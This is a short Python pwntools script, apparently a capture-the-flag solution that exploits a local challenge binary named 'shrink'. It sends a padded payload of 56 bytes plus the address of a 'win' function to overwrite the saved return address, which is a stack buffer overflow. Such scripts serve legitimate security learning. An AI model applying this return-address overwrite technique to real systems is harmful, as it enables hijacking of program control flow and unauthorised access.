from pwn import *

elf = context.binary = ELF("./shrink")

# context.log_level = "debug"

p = remote("localhost", 1337)
# p = process("./shrink")
# p = gdb.debug("./shrink")

def add_exclamation():
    p.recvuntil(b"4. Exit\n")
    p.sendline(b"3")

def change_name(name):
    p.recvuntil(b"4. Exit\n")
    p.sendline(b"2")
    p.recvuntil(b"new name: \n")
    p.sendline(name)

def exit():
    p.recvuntil(b"4. Exit\n")
    p.sendline(b"4")

# call add_exclamation() 40 times
for i in range(40):
    add_exclamation()

# move string to stack
change_name(b"asdf")
# overwrite rip
change_name(b"A" * 56 + p64(elf.sym["_Z3winv"]))
# trigger return
exit()

print(p.recvlineS().strip())
